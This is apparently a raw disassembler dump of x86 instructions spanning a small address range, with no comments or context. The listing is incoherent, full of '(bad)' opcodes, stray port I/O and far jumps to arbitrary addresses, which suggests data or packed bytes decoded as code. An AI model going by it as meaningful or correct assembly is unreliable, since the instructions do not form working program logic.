  4172a9:	xor    al,0x7a
  4172ab:	aad    0xa
  4172ad:	(bad)  
  4172ae:	mov    es,WORD PTR [edi+0x45f64ff3]
  4172b4:	dec    edx
  4172b5:	into   
  4172b6:	or     esp,DWORD PTR [edx]
  4172b8:	pop    esi
  4172b9:	mov    ebx,0x9de1d80
  4172be:	leave  
  4172bf:	enter  0xa7b2,0x8b
  4172c3:	outs   dx,DWORD PTR cs:[esi]
  4172c5:	mov    esi,0x1d9122f9
  4172ca:	sti    
  4172cb:	leave  
  4172cc:	pusha  
  4172cd:	mov    esp,0xed92c5aa
  4172d2:	xchg   ebx,eax
  4172d3:	aaa    
  4172d4:	iret   
  4172d5:	inc    ebx
  4172d6:	popa   
  4172d7:	rol    DWORD PTR [esi-0x76],cl
  4172da:	cld    
  4172db:	push   0x48
  4172dd:	call   0x4b3a7b75
  4172e2:	push   es
  4172e3:	mov    edx,0x99af208c
  4172e8:	outs   dx,BYTE PTR ds:[esi]
  4172e9:	and    DWORD PTR [edx],0xa5dcbdbf
  4172ef:	add    ecx,DWORD PTR [ecx]
  4172f1:	aas    
  4172f2:	push   ecx
  4172f3:	mov    al,cl
  4172f5:	(bad)  
  4172f6:	in     al,dx
  4172f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172f8:	iret   
  4172f9:	inc    edi
  4172fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172fb:	imul   edx,ebx,0x28cf350d
  417301:	loop   0x41733b
  417303:	xlat   BYTE PTR ds:[ebx]
  417304:	sub    BYTE PTR [eax-0x7a6a4fc7],dl
  41730a:	xchg   ebx,eax
  41730b:	rcr    DWORD PTR [ecx-0x18f6f35b],0x12
  417312:	inc    esp
  417313:	xchg   ebx,eax
  417314:	call   0x55dfd701
  417319:	loope  0x417385
  41731b:	fimul  DWORD PTR [esi]
  41731d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41731f:	add    ebx,0xcb7801dd
  417325:	adc    DWORD PTR [edx],0x677ab027
  41732b:	xor    esi,DWORD PTR [esi-0x44978931]
  417331:	mov    edi,0x44b218f4
  417336:	xchg   ah,ah
  417338:	test   BYTE PTR [ecx],ch
  41733a:	icebp  
  41733b:	or     eax,0x667f193f
  417340:	cmp    DWORD PTR [edi],ebx
  417342:	out    dx,eax
  417343:	sbb    DWORD PTR [edi-0x13847629],esp
  417349:	inc    eax
  41734a:	mov    DWORD PTR [ecx],edi
  41734c:	mov    ecx,0x7019c2c5
  417351:	add    ebx,DWORD PTR [ebx]
  417353:	adc    bh,BYTE PTR [esi+0x6b6bef57]
  417359:	mov    al,ds:0x4fb6203e
  41735e:	pop    es
  41735f:	dec    ebx
  417360:	je     0x4172f7
  417362:	adc    eax,0xd9c32a95
  417367:	push   es
  417368:	mov    esp,edx
  41736a:	or     ch,BYTE PTR [eax+ecx*4-0x3d]
  41736e:	enter  0x7b4f,0x3c
  417372:	inc    edi
  417373:	mov    dh,0x9c
  417376:	mov    cl,0x65
  417378:	add    esi,DWORD PTR [eax-0x785a63f7]
  41737e:	and    DWORD PTR [ecx],esp
  417380:	int3   
  417381:	push   ebp
  417382:	sbb    eax,0xd3d0518e
  417387:	fild   DWORD PTR ds:0xe7eb5115
  41738d:	fnstenv [esp+ecx*2+0x7f]
  417391:	popa   
  417392:	xor    BYTE PTR [edi+0x49],ah
  417395:	push   cs
  417396:	in     eax,0x1a
  417398:	cmp    al,0x63
  41739a:	xor    eax,0x551654bb
  41739f:	sub    al,0x34
  4173a1:	sbb    edx,esi
  4173a3:	fiadd  DWORD PTR ds:0x5bf2e799
  4173a9:	data16 rcl BYTE PTR [edi],cl
  4173ac:	sbb    bh,BYTE PTR [ecx+edx*4]
  4173af:	popf   
  4173b0:	or     DWORD PTR [eax+eax*2+0x7b9d0409],esp
  4173b7:	sbb    DWORD PTR ds:0x4925d0ed,ebp
  4173bd:	xchg   esp,eax
  4173be:	inc    edx
  4173bf:	repz dec edi
  4173c1:	shr    BYTE PTR [edx+ecx*8+0x72],0xf6
  4173c6:	out    dx,al
  4173c7:	xchg   ch,ah
  4173c9:	mov    esi,0x67bbe22e
  4173ce:	jle    0x417397
  4173d0:	cwde   
  4173d1:	and    esi,DWORD PTR [eax+0x44]
  4173d4:	mov    ch,0x7f
  4173d6:	lahf   
  4173d7:	nop
  4173d8:	loop   0x417376
  4173da:	repnz daa 
  4173dc:	pop    ebp
  4173dd:	xor    eax,0xd8d9c5cc
  4173e2:	ins    BYTE PTR es:[edi],dx
  4173e3:	in     eax,dx
  4173e4:	icebp  
  4173e5:	stos   BYTE PTR es:[edi],al
  4173e6:	div    eax
  4173e8:	xchg   BYTE PTR [ecx+0x21fae1f6],cl
  4173ee:	sbb    BYTE PTR [esi+0x58],cl
  4173f1:	enter  0x7424,0x37
  4173f5:	pusha  
  4173f6:	out    0xcb,eax
  4173f8:	sbb    ch,BYTE PTR ds:0x9cfe9677
  4173fe:	mov    eax,0xef71e6e7
  417403:	loop   0x41746b
  417405:	enter  0x1470,0x93
  417409:	inc    ecx
  41740a:	cmp    DWORD PTR [ebp+0x51a6f1c0],ebx
  417410:	mov    eax,ds:0x3f036552
  417415:	mov    edx,0xd938d5df
  41741a:	xchg   ecx,eax
  41741b:	daa    
  41741c:	pushf  
  41741d:	popf   
  41741e:	lods   eax,DWORD PTR ds:[esi]
  41741f:	mov    eax,0x84c3c59a
  417424:	sbb    dl,ch
  417426:	out    dx,eax
  417427:	xchg   ecx,eax
  417428:	mov    ah,0x5a
  41742a:	lahf   
  41742b:	dec    esp
  41742c:	jge    0x417468
  41742e:	push   esi
  41742f:	pushf  
  417430:	push   eax
  417431:	dec    esi
  417432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417433:	pushf  
  417434:	int    0x98
  417436:	aad    0x90
  417438:	jo     0x417480
  41743a:	cmp    al,ch
  41743c:	and    eax,0xb225c76
  417441:	mov    ebp,0xafb45859
  417446:	mov    ebp,0x6c16d817
  41744b:	repz or DWORD PTR [esi+0x25c0ae08],esi
  417452:	js     0x4173fb
  417454:	pop    es
  417455:	fisttp WORD PTR [edx-0x3]
  417458:	inc    ebx
  417459:	clc    
  41745a:	pop    es
  41745b:	jae    0x417454
  41745d:	sbb    al,0xa
  41745f:	add    eax,0x56a97ef3
  417464:	aaa    
  417465:	mov    al,0x3d
  417467:	lods   al,BYTE PTR ds:[esi]
  417468:	add    BYTE PTR [edx-0xa],dl
  41746b:	loope  0x41743b
  41746d:	fnstcw WORD PTR [ecx]
  41746f:	pop    ebp
  417470:	sub    al,0x34
  417472:	(bad)  
  417474:	mov    bh,dh
  417476:	mov    esp,ds
  417478:	pop    ss
  417479:	inc    ecx
  41747a:	mov    bh,dl
  41747c:	sub    eax,0x7a0513d0
  417481:	xchg   ebp,eax
  417482:	ss add eax,0xd92ce85d
  417488:	repnz mov esi,0xfe432a2e
  41748e:	test   ebp,ecx
  417490:	mov    ah,0x8
  417492:	jmp    0xc96ff2a9
  417497:	add    esp,DWORD PTR [ecx-0x2ea3a00b]
  41749d:	mov    bl,bh
  41749f:	daa    
  4174a0:	aam    0xf6
  4174a2:	xchg   ebp,eax
  4174a3:	pusha  
  4174a4:	xlat   BYTE PTR ds:[ebx]
  4174a5:	push   eax
  4174a6:	xor    ecx,DWORD PTR [edi+0x51db4a64]
  4174ac:	addr16 (bad) 
  4174ae:	jge    0x41747e
  4174b0:	aaa    
  4174b1:	xor    DWORD PTR [ebp+0x6f],ebp
  4174b4:	in     eax,dx
  4174b5:	mov    ah,BYTE PTR [ebx+0x76c7840d]
  4174bb:	loop   0x4174f9
  4174bd:	arpl   bx,si
  4174bf:	xor    al,0xcb
  4174c1:	(bad)  
  4174c2:	xor    eax,DWORD PTR [edi]
  4174c4:	int    0xef
  4174c6:	adc    al,0xcd
  4174c8:	outs   dx,DWORD PTR ds:[esi]
  4174c9:	sub    al,BYTE PTR [ebp-0x78b20f4a]
  4174cf:	scas   al,BYTE PTR es:[edi]
  4174d0:	fmul   QWORD PTR [esi]
  4174d2:	xchg   esi,eax
  4174d3:	xchg   edi,eax
  4174d4:	and    dh,ah
  4174d6:	add    DWORD PTR [esi+0x66ff17a1],ebp
  4174dc:	sar    BYTE PTR [ebx-0x17224286],0x31
  4174e3:	(bad)  
  4174e4:	retf   
  4174e5:	xor    DWORD PTR [ebp+0x2ab72062],0xb0daf5d0
  4174ef:	jb     0x4174e8
  4174f1:	jne    0x41749c
  4174f3:	sbb    BYTE PTR [esi],dl
  4174f5:	out    dx,eax
  4174f6:	pop    esi
  4174f7:	xlat   BYTE PTR ds:[ebx]
  4174f8:	xlat   BYTE PTR ds:[ebx]
  4174f9:	push   0x2c
  4174fb:	rcr    ch,1
  4174fd:	test   ecx,eax
  4174ff:	lea    edx,[ebx+0x7b]
  417502:	push   eax
  417503:	cld    
  417504:	xor    ebx,0xffffff9b
  417507:	xchg   esp,eax
  417508:	jg     0x41757a
  41750a:	cli    
  41750b:	cmc    
  41750c:	fisttp QWORD PTR [ebx-0x10]
  41750f:	mov    esp,0x3a180676
  417514:	push   edx
  417515:	sub    dl,BYTE PTR [edx]
  417517:	in     al,dx
  417518:	jle    0x4174cd
  41751a:	lds    esi,FWORD PTR [edi]
  41751c:	push   esi
  41751d:	out    dx,al
  41751e:	ins    DWORD PTR es:[edi],dx
  41751f:	jo     0x4174ce
  417521:	sahf   
  417522:	icebp  
  417523:	pop    esi
  417524:	inc    ecx
  417525:	imul   esp,ebx,0xffffffe0
  417528:	aaa    
  417529:	mov    ch,0xa4
  41752b:	push   cs
  41752c:	in     al,0x71
  41752e:	sub    BYTE PTR [ebp-0xf0434e0],ah
  417534:	inc    eax
  417535:	retf   
  417536:	arpl   WORD PTR [ecx-0x237da89],di
  41753c:	cs pop ss
  41753e:	(bad)  
  41753f:	stos   DWORD PTR es:[edi],eax
  417540:	xchg   edx,eax
  417541:	mov    ebp,0xd892f4b5
  417546:	push   edi
  417547:	std    
  417548:	aam    0x9d
  41754a:	addr16 dec esi
  41754d:	lea    esi,[esi+ecx*1+0x1ae022b1]
  417554:	lahf   
  417555:	mov    ebx,0xe9ec92f5
  41755a:	sbb    ch,bl
  41755c:	aas    
  41755d:	cmp    ah,bh
  41755f:	retf   0x5e6
  417562:	cmp    DWORD PTR [edi-0x5c],esi
  417565:	ins    BYTE PTR es:[edi],dx
  417566:	jb     0x417504
  417568:	sahf   
  417569:	popa   
  41756a:	lock out 0xe5,al
  41756d:	shl    BYTE PTR [ecx-0x600aff4e],1
  417573:	mov    edi,esp
  417575:	and    eax,0xaf10e3ee
  41757a:	mov    BYTE PTR [eax],ah
  41757c:	les    ebp,FWORD PTR [edx-0x75e01b7a]
  417582:	pop    es
  417583:	and    DWORD PTR [esi+0x6a],0x27
  417587:	xor    dl,BYTE PTR [eax-0x7107d87d]
  41758d:	fimul  DWORD PTR [bp+si+0x6564]
  417592:	sub    ah,ch
  417594:	mov    eax,esp
  417596:	sub    esi,DWORD PTR [edi]
  417598:	iret   
  417599:	stos   DWORD PTR es:[edi],eax
  41759a:	and    DWORD PTR [edx-0x2ca13a20],ecx
  4175a0:	mov    eax,ds:0xa3747089
  4175a5:	pop    esp
  4175a6:	pop    esi
  4175a7:	or     eax,0x623334a1
  4175ac:	das    
  4175ad:	mov    ds:0x2cf059f9,eax
  4175b2:	aam    0x52
  4175b4:	mov    ecx,0x8b1d075f
  4175b9:	pop    esp
  4175ba:	inc    esp
  4175bb:	xchg   edi,eax
  4175bc:	aam    0x81
  4175be:	jne    0x4175b5
  4175c0:	aam    0x75
  4175c2:	das    
  4175c3:	dec    ecx
  4175c4:	dec    edi
  4175c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175c6:	mov    ah,0xa
  4175c8:	and    al,0x65
  4175ca:	fs push edx
  4175cc:	or     BYTE PTR [esi+0x74f9539e],bh
  4175d2:	mov    ah,0xd1
  4175d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175d5:	rol    DWORD PTR [ebp+edx*8-0x63],0x0
  4175da:	xor    dl,dl
  4175dc:	xchg   edi,eax
  4175dd:	inc    di
  4175df:	lods   eax,DWORD PTR ds:[esi]
  4175e0:	xchg   esp,eax
  4175e1:	adc    eax,0xbb9b348e
  4175e6:	mov    ebx,0xb69e2f78
  4175eb:	gs add al,0x3d
  4175ee:	mov    ?,WORD PTR ds:0xedc7f107
  4175f4:	aad    0xb9
  4175f6:	sbb    BYTE PTR [esi+0x457ae62d],bh
  4175fc:	sub    BYTE PTR [ebx+0x65adfe26],ah
  417602:	jl     0x417662
  417604:	mov    eax,ds:0x339e4988
  417609:	pop    ebp
  41760a:	push   edi
  41760b:	xlat   BYTE PTR ds:[ebx]
  41760c:	inc    esp
  41760d:	dec    ebp
  41760e:	sbb    cl,cl
  417610:	inc    ebx
  417611:	jge    0x4175d3
  417613:	outs   dx,BYTE PTR ds:[esi]
  417614:	fdiv   QWORD PTR [ebx]
  417616:	repz addr16 mov ebx,0xed90d8ce
  41761d:	dec    ebp
  41761e:	pusha  
  41761f:	fcomp  QWORD PTR [ebx+0x29]
  417622:	and    al,0x8b
  417624:	sub    BYTE PTR [esi+ebp*8+0xe07fcf9],dh
  41762b:	les    ecx,FWORD PTR [esi]
  41762d:	cmp    ch,BYTE PTR [ecx]
  41762f:	imul   esi,DWORD PTR [edx+0x22],0xffffffd9
  417633:	dec    eax
  417634:	dec    eax
  417635:	stos   BYTE PTR es:[edi],al
  417636:	lock dec edi
  417638:	and    cl,BYTE PTR [esi+0x6b]
  41763b:	nop
  41763c:	test   BYTE PTR [eax-0x3db81c27],ch
  417642:	iret   
  417643:	loop   0x4176b9
  417645:	cld    
  417646:	enter  0x6d18,0xec
  41764a:	(bad)  
  41764c:	fisttp WORD PTR [ebp+edi*8-0x3f239a40]
  417653:	or     ebp,eax
  417655:	and    ecx,DWORD PTR [eax+ecx*8]
  417658:	ins    DWORD PTR es:[edi],dx
  417659:	jp     0x417639
  41765b:	popa   
  41765c:	jb     0x417646
  41765e:	pop    esi
  41765f:	mov    al,0xdb
  417661:	and    al,BYTE PTR [edx]
  417663:	pusha  
  417664:	or     al,dh
  417666:	popa   
  417667:	and    ebx,ebp
  417669:	ins    BYTE PTR es:[edi],dx
  41766a:	xchg   edi,eax
  41766b:	outs   dx,BYTE PTR ds:[esi]
  41766c:	cwde   
  41766d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41766e:	int3   
  41766f:	push   esp
  417670:	add    bl,BYTE PTR [ecx+eax*1-0x6978ac6d]
  417677:	outs   dx,DWORD PTR ds:[esi]
  417678:	push   ss
  417679:	gs push esi
  41767b:	jno    0x417652
  41767d:	dec    ebx
  41767e:	inc    eax
  41767f:	mov    bl,0x2a
  417681:	call   0x7173f5b
  417686:	popa   
  417687:	jle    0x4176c9
  417689:	pop    ss
  41768a:	popf   
  41768b:	retf   
  41768c:	sti    
  41768d:	cmp    ch,cl
  41768f:	jp     0x417623
  417691:	mov    bh,0xd
  417693:	xchg   ebp,eax
  417694:	and    edi,ebx
  417696:	sub    eax,DWORD PTR [edx-0x70]
  417699:	adc    ebx,ebx
  41769b:	mov    ds:0xf4de6f62,eax
  4176a0:	out    dx,eax
  4176a1:	cld    
  4176a2:	mov    cl,0x71
  4176a4:	fild   DWORD PTR [esi+0x7ddea59c]
  4176aa:	loope  0x4176bd
  4176ac:	pop    ebx
  4176ad:	test   al,0x15
  4176af:	add    al,0x1d
  4176b1:	xchg   ebx,eax
  4176b2:	add    DWORD PTR [edi+edx*8],eax
  4176b5:	mov    ecx,0x6cb9178a
  4176ba:	cmp    ecx,edx
  4176bc:	jnp    0x4176c8
  4176be:	pop    edi
  4176bf:	cmp    BYTE PTR [ebx-0x4c473507],cl
  4176c5:	in     eax,0xb7
  4176c7:	js     0x417709
  4176c9:	mov    ebx,0xf3e5602c
  4176ce:	mov    ds:0x18d80fc4,al
  4176d3:	add    DWORD PTR [edi-0x20bab864],0x20
  4176da:	jg     0x4176e8
  4176dc:	mov    esi,0x6c563e6d
  4176e1:	outs   dx,DWORD PTR ds:[esi]
  4176e2:	jp     0x41768a
  4176e4:	mov    ebp,0x4b029c4e
  4176e9:	lods   eax,DWORD PTR ds:[esi]
  4176ea:	cmc    
  4176eb:	scas   eax,DWORD PTR es:[edi]
  4176ec:	addr16 adc al,0xb7
  4176ef:	(bad)  
  4176f0:	retf   0xd04a
  4176f3:	fld    QWORD PTR [eax+0x47]
  4176f6:	in     eax,0x13
  4176f8:	iret   
  4176f9:	inc    esp
  4176fa:	bound  ebx,QWORD PTR [ebx]
  4176fc:	sub    al,0x9e
  4176fe:	adc    esp,DWORD PTR [ebx*4-0x15a261cf]
  417705:	ins    DWORD PTR es:[edi],dx
  417706:	fmul   DWORD PTR ds:0xbf5787
  41770c:	leave  
  41770d:	push   ss
  41770e:	xchg   edi,eax
  41770f:	(bad)  
  417710:	mov    ds:0x3afa40f8,eax
  417715:	(bad)  
  417716:	stos   DWORD PTR es:[edi],eax
  417717:	or     al,0x4
  417719:	push   ss
  41771a:	mov    dl,0xcd
  41771c:	ret    0x844f
  41771f:	inc    eax
  417720:	xor    eax,ecx
  417722:	(bad)  [esi-0x7b5e536b]
  417728:	in     al,0xf1
  41772a:	mov    ch,0x87
  41772c:	ins    DWORD PTR es:[edi],dx
  41772d:	jg     0x41778a
  41772f:	xor    ebp,DWORD PTR [ebx-0x28]
  417732:	call   0x5f69:0x1846311b
  417739:	pop    edx
  41773a:	sbb    eax,0xb6923dd0
  41773f:	mov    ch,0xe
  417741:	mov    WORD PTR [edi-0x5d],ds
  417744:	fild   DWORD PTR [esi]
  417746:	stc    
  417747:	jo     0x4176d6
  417749:	jg     0x417756
  41774b:	add    BYTE PTR [ecx-0x4b],ah
  41774e:	bound  esp,QWORD PTR [ebx+0x59098ee1]
  417754:	jmp    0x404fc31c
  417759:	in     eax,0xc0
  41775b:	popf   
  41775c:	mov    ah,0xb1
  41775e:	cmp    eax,0x454e91c9
  417763:	stos   BYTE PTR es:[edi],al
  417764:	aaa    
  417765:	lods   al,BYTE PTR ds:[esi]
  417766:	gs nop
  417768:	add    BYTE PTR [ecx],ah
  41776a:	mov    al,al
  41776c:	mov    ah,0x60
  41776e:	jbe    0x4176f7
  417770:	push   eax
  417771:	pushw  es
  417773:	(bad)  
  417774:	cmc    
  417775:	or     ebp,edx
  417777:	das    
  417778:	imul   ebx,DWORD PTR [edx+edi*1],0xffffffbd
  41777c:	sub    al,0x90
  41777e:	add    edi,esi
  417780:	sub    eax,0x3bf4e50d
  417785:	sbb    DWORD PTR [esi],0xeb9dfc
  41778b:	pop    esp
  41778c:	out    0xa4,al
  41778e:	icebp  
  41778f:	adc    BYTE PTR [eax-0x214c7e0d],ah
  417795:	mov    ebp,0x45742bc1
  41779a:	adc    DWORD PTR [edx],ebp
  41779c:	les    esp,FWORD PTR [edx*2-0x3efcc5b7]
  4177a3:	jmp    0xf3b8:0x1b95558
  4177aa:	or     BYTE PTR [edi-0x780a7a1a],0xfc
  4177b1:	inc    esp
  4177b2:	dec    ebx
  4177b3:	and    esi,edx
  4177b5:	inc    eax
  4177b6:	sub    esp,DWORD PTR [esi]
  4177b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177b9:	mov    esi,0xdb0c8f51
  4177be:	mov    edi,0x89a5cd3
  4177c3:	push   ebp
  4177c4:	cld    
  4177c5:	xlat   BYTE PTR ds:[ebx]
  4177c6:	jmp    0x7c07:0x840932cc
  4177cd:	(bad)  
  4177cf:	iret   
  4177d0:	fadd   QWORD PTR [esi+0x1fa82ec0]
  4177d6:	rol    BYTE PTR [edx+0x31],0x8d
  4177da:	std    
  4177db:	dec    eax
  4177dc:	adc    eax,0xa6d54027
  4177e1:	mov    bh,0xc8
  4177e3:	sbb    al,0xa0
  4177e5:	mov    dl,0x86
  4177e7:	mov    BYTE PTR [ecx-0x2a77098f],bl
  4177ed:	jmp    0xda67459
  4177f2:	xchg   edx,eax
  4177f3:	sbb    eax,0x801088b2
  4177f8:	push   ecx
  4177f9:	jge    0x41783a
  4177fb:	pop    ss
  4177fc:	clc    
  4177fd:	sub    eax,0xec617bbd
  417802:	jb     0x41779a
  417804:	xchg   ch,al
  417806:	je     0x41779e
  417808:	mov    esp,0xce1494d6
  41780d:	mov    al,ds:0x9e216bfc
  417812:	inc    edi
  417813:	popf   
  417814:	shr    esi,0xbf
  417817:	cmp    ah,BYTE PTR [edx]
  417819:	xchg   ebp,eax
  41781a:	xor    al,0x8b
  41781c:	jmp    0x41780f
  41781e:	cmp    dh,dh
  417820:	mov    dh,0xd3
  417822:	jnp    0x417892
  417824:	sbb    cl,ch
  417826:	aad    0x4f
  417828:	push   ebx
  417829:	pusha  
  41782a:	in     ax,0xfe
  41782d:	jmp    0x2f19:0xcbaeb2c
  417834:	mov    eax,0xdccf16e4
  417839:	and    edx,esp
  41783b:	addr16 push esp
  41783d:	sbb    eax,0x5ee15b93
  417842:	mov    edx,0x6f8aabcb
  417847:	dec    edi
  417848:	clc    
  417849:	sbb    dh,BYTE PTR [edx]
  41784b:	pop    ebp
  41784c:	push   ss
  41784d:	pop    ebp
  41784e:	in     eax,dx
  41784f:	pop    edx
  417850:	mov    ds,esi
  417852:	jecxz  0x4178a1
  417854:	inc    esp
  417855:	das    
  417856:	in     eax,0x8e
  417858:	stc    
  417859:	inc    esi
  41785a:	repnz cmp eax,0x9f1a959f
  417860:	mov    al,0xf
  417862:	call   0xf2541673
  417867:	inc    ecx
  417868:	sbb    BYTE PTR [ecx],0x30
  41786b:	jge    0x417811
  41786d:	dec    ecx
  41786e:	add    eax,0x4380a16f
  417873:	pop    edi
  417874:	in     al,dx
  417875:	cmp    cl,BYTE PTR [esi-0x5f2ac6b6]
  41787b:	jmp    0x41787c
  41787d:	call   0xc2e5:0xe28f4117
  417884:	add    esp,ebp
  417886:	jns    0x417865
  417888:	pop    es
  417889:	fdiv   QWORD PTR [esi-0x1d]
  41788c:	mov    dl,0x5
  41788e:	ret    
  41788f:	mov    edx,DWORD PTR [ebp-0x37fa4572]
  417895:	pop    ds
  417896:	(bad)  
  417897:	xchg   ecx,eax
  417898:	jge    0x4178c1
  41789a:	out    dx,eax
  41789b:	push   eax
  41789c:	popf   
  41789d:	pop    edx
  41789e:	xchg   esp,eax
  41789f:	addr16 ss xchg esp,eax
  4178a2:	xor    dl,bh
  4178a4:	(bad)  
  4178a5:	neg    DWORD PTR [ebx-0x6]
  4178a8:	test   DWORD PTR [eax+eiz*1-0x59],eax
  4178ac:	push   esi
  4178ad:	mov    ch,0x66
  4178af:	retf   
  4178b0:	outs   dx,DWORD PTR ds:[esi]
  4178b1:	mov    eax,ds:0xf531528d
  4178b6:	dec    ebx
  4178b7:	nop
  4178b8:	xor    DWORD PTR ds:0xb43b4590,edi
  4178be:	push   es
  4178bf:	cmp    BYTE PTR [ecx+0x48],dl
  4178c2:	adc    sp,WORD PTR [ecx-0x4]
  4178c6:	mov    bh,0xc7
  4178c8:	xor    BYTE PTR [ecx+ecx*4+0xef38fae],0xb9
  4178d0:	(bad)  
  4178d1:	mov    edx,0x2661c8e7
  4178d6:	adc    al,0xd0
  4178d8:	outs   dx,BYTE PTR ds:[esi]
  4178d9:	mov    ebx,0x63c45db8
  4178de:	test   DWORD PTR [edx],esi
  4178e0:	(bad)  
  4178e2:	sub    bl,dl
  4178e4:	jmp    0x417882
  4178e6:	test   BYTE PTR [eax+ecx*4],0xde
  4178ea:	in     eax,dx
  4178eb:	sbb    eax,0xcdbd139e
  4178f0:	in     al,dx
  4178f1:	push   edi
  4178f2:	adc    BYTE PTR [ebp+0x64],cl
  4178f5:	sub    BYTE PTR [edi-0x2465d89a],0x73
  4178fc:	out    0x18,eax
  4178fe:	xor    al,0xff
  417900:	loop   0x417920
  417902:	frstor [ebp-0x15a795bf]
  417908:	(bad)
  41790d:	cmpxchg BYTE PTR [edi+edi*4-0x30f17a12],dl
  417915:	int3   
  417916:	pusha  
  417917:	imul   esi,DWORD PTR ds:0x1d07fb45,0xffffff98
  41791e:	adc    eax,0xb84d60d5
  417923:	pop    ebx
  417924:	jbe    0x417933
  417926:	push   ss
  417927:	mov    ecx,0x6d604173
  41792c:	jg     0x417999
  41792e:	mov    es,ebx
  417930:	aad    0x4d
  417932:	pop    edi
  417933:	push   ebp
  417934:	out    0xe3,eax
  417936:	xchg   ecx,ebx
  417938:	loop   0x4179a5
  41793a:	iret   
  41793b:	loop   0x4178d4
  41793d:	in     eax,0xbd
  41793f:	repnz retf 0xc299
  417943:	jecxz  0x41791a
  417945:	fild   DWORD PTR [esi]
  417947:	inc    esp
  417948:	fist   DWORD PTR [edi]
  41794a:	jbe    0x417975
  41794c:	or     cl,BYTE PTR [ebp-0x1b23c5c4]
  417952:	ror    BYTE PTR [edi+0x5e990ca7],cl
  417958:	cmp    DWORD PTR [ebx+0x6bdb74d9],edx
  41795e:	xchg   edx,eax
  41795f:	sub    eax,0x2760681a
  417964:	inc    esi
  417965:	sub    esi,DWORD PTR [ebx]
  417967:	mov    cl,0x9b
  417969:	(bad)  
  41796a:	pop    esi
  41796b:	fs mov esp,0xd23a8bbe
  417971:	mov    bh,0xde
  417973:	sub    eax,0xe9277706
  417978:	in     al,0x6e
  41797a:	call   0x49bafb73
  41797f:	cmc    
  417980:	and    eax,0x8afab438
  417985:	addr16 leave 
  417987:	aam    0xf2
  417989:	loope  0x41795b
  41798b:	add    BYTE PTR [ecx],cl
  41798d:	mov    ?,WORD PTR [ebx+0x47ed270d]
  417993:	adc    al,0xd1
  417995:	xchg   esp,eax
  417996:	pop    ebp
  417997:	mov    eax,ds:0x32e31d29
  41799c:	add    eax,0x5e97be82
  4179a1:	stos   DWORD PTR es:[edi],eax
  4179a2:	jle    0x417a1b
  4179a4:	mov    ds:0xd728f16c,al
  4179a9:	fstp   DWORD PTR ds:[edi+eiz*1]
  4179ad:	out    0x79,al
  4179af:	jbe    0x417961
  4179b1:	ins    DWORD PTR es:[edi],dx
  4179b2:	(bad)  
  4179b3:	out    0xac,eax
  4179b5:	stc    
  4179b6:	push   edi
  4179b7:	push   0x3bc132ae
  4179bc:	in     eax,dx
  4179bd:	enter  0x34ef,0x49
  4179c1:	cmc    
  4179c2:	in     al,0x5a
  4179c4:	xor    al,dl
  4179c6:	pop    edx
  4179c7:	lock mov ebx,0xf4fbd1e9
  4179cd:	push   ds
  4179ce:	cvttps2pi mm1,QWORD PTR [edi+0x26578d76]
  4179d5:	pop    edi
  4179d6:	jnp    0x4179b5
  4179d8:	dec    ebx
  4179d9:	mov    ch,0x52
  4179db:	addr16 pop ecx
  4179dd:	test   eax,0xc87c91ac
  4179e2:	leave  
  4179e3:	clc    
  4179e4:	mov    ch,0xbf
  4179e6:	inc    edi
  4179e7:	loop   0x4179d3
  4179e9:	je     0x417a52
  4179eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179ec:	or     al,0xfb
  4179ee:	mov    edi,esi
  4179f0:	frstor [ecx-0x1a1ca48c]
  4179f6:	push   edi
  4179f7:	ss dec edi
  4179f9:	mov    cx,0xfcfb
  4179fd:	in     eax,0x7d
  4179ff:	imul   edx,DWORD PTR ds:0x2384e93f,0xffffffb2
  417a06:	inc    ebp
  417a07:	cli    
  417a08:	fst    DWORD PTR [ebx]
  417a0a:	loope  0x41799b
  417a0c:	inc    esi
  417a0d:	xchg   edi,eax
  417a0e:	jp     0x417a0e
  417a10:	out    0xfa,al
  417a12:	jp     0x4179ef
  417a14:	comiss xmm3,DWORD PTR [edi+0x25]
  417a18:	sub    ebp,esp
  417a1a:	adc    edx,esi
  417a1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a1d:	jmp    0xe16b0594
  417a22:	retf   
  417a23:	std    
  417a24:	fwait
  417a25:	xchg   ecx,eax
  417a26:	sbb    al,BYTE PTR [edx-0x16c91a26]
  417a2c:	pop    eax
  417a2d:	retf   
  417a2e:	push   edx
  417a2f:	or     ebp,DWORD PTR [ecx+0x4ed51c4c]
  417a35:	jbe    0x417a8c
  417a37:	loopne 0x417a69
  417a39:	push   edx
  417a3a:	gs stos BYTE PTR es:[edi],al
  417a3c:	cmp    ah,BYTE PTR [esi+ebp*8-0x735b0030]
  417a43:	popa   
  417a44:	loopne 0x4179ea
  417a46:	mov    edx,0xcb3b5273
  417a4b:	cmp    DWORD PTR [edx-0xf],ebx
  417a4e:	ds jge 0x4179eb
  417a51:	inc    edx
  417a52:	fisttp QWORD PTR [ebx]
  417a54:	retf   0x4234
  417a57:	neg    DWORD PTR [ebx]
  417a59:	sar    BYTE PTR [edx+0x7a],1
  417a5c:	test   eax,0x74e37073
  417a61:	pop    esi
  417a62:	push   ebx
  417a63:	lock jo 0x417a46
  417a66:	(bad)  
  417a67:	cmp    DWORD PTR [ebp+0x7a],ebp
  417a6a:	lods   al,BYTE PTR ds:[esi]
  417a6b:	mov    eax,0x659786e2
  417a70:	arpl   WORD PTR ds:0x9e7cad90,cx
  417a76:	jg     0x417aa8
  417a78:	pop    esp
  417a79:	out    dx,al
  417a7a:	clc    
  417a7b:	or     DWORD PTR [ebp-0x36],eax
  417a7e:	stos   DWORD PTR es:[edi],eax
  417a7f:	mov    ah,0x8e
  417a81:	aad    0xc4
  417a83:	cmp    al,0xd8
  417a85:	push   ecx
  417a86:	test   BYTE PTR [edi],bh
  417a88:	mov    ds:0xb402d1c9,eax
  417a8d:	add    al,0xca
  417a8f:	adc    eax,0x34a16757
  417a94:	mov    esp,0x229e2047
  417a99:	mov    DWORD PTR [edi-0x5b],edx
  417a9c:	(bad)  [eax-0x10bd0223]
  417aa2:	cmp    edi,esp
